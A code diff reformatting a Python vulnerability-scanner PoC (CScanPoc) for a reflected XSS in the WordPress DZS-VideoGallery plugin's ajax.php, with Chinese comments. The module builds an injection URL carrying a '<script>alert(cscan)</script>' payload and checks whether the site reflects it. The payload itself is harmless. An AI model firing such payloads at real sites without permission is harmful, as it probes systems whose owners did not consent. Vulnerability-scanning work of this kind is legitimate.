@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0033' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0033'  # 平台漏洞编号，留空
     name = 'WordPress DZS-VideoGallery ajax.php 跨站脚本'  # 漏洞名称
     level = VulnLevel.MED  # 漏洞危害级别
-    type = VulnType.XSS # 漏洞类型
+    type = VulnType.XSS  # 漏洞类型
     disclosure_date = '2014-02-24'  # 漏洞公布时间
     desc = '''
         WordPress是一款使用PHP语言开发的内容管理系统。DZS-VideoGallery是其中的一个DZS视频库插件。 
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'DZS-VideoGallery'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '5b47adeb-e682-4371-a135-7cf70e09b171'
@@ -32,15 +34,15 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #https://www.exploit-db.com/exploits/39553/
+
+            # https://www.exploit-db.com/exploits/39553/
             payload = "/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&amp;height=400&amp;"
             payload += "width=610&amp;type=vimeo&amp;source=%22/><script>alert(cscan)</script>"
             verify_url = self.target + payload
             #code, head, res, errcode, _ = curl.curl(url)
             r = requests.get(verify_url)
             if r.status_code == 200 and '<script>alert(cscan)</script>' in r.content:
-                #security_hole(url)
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
